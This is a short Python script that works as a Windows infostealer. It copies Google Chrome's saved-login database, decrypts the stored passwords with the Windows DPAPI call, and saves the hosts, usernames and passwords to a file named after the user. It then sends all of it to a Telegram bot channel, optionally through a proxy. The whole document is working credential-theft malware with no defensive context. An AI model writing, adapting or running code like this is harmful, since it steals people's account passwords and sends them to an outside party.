import os, sqlite3, win32crypt, requests, shutil

USE_PROXY   = True
PROXY_IP    = ...
PROXY_PORT  = ...

URL         = 'https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=html'
TOKEN       = ...
CHANNELID   = ...

databasePath = os.environ['LOCALAPPDATA'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
result = '=== Extracted from %s computer ===\n' % os.environ['USERNAME']

if os.path.exists(databasePath):
    try:
        shutil.copy(databasePath, './database')
        connection = sqlite3.connect('./database')

        cursor = connection.cursor()
        query  = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        value  = query.fetchall()
        
        connection.close()
        os.remove('./database')

        for info in value:
            password = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
            if password:
                result += 'Host: %s\nLogin: %s\nPassword: %s\n\n' % (info[:2] + (password.decode('utf-8'),))
    except Exception as e: result = '[-] Error: ' + str(e)
else: result = '[!] Google Chrome is not installed!'

proxyDict = {'https': 'https://%s:%s' % (PROXY_IP, PROXY_PORT)} if USE_PROXY else None

open(os.environ['USERNAME'] + '.txt', mode = 'w').write(result.strip())
requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result), proxies = proxyDict)
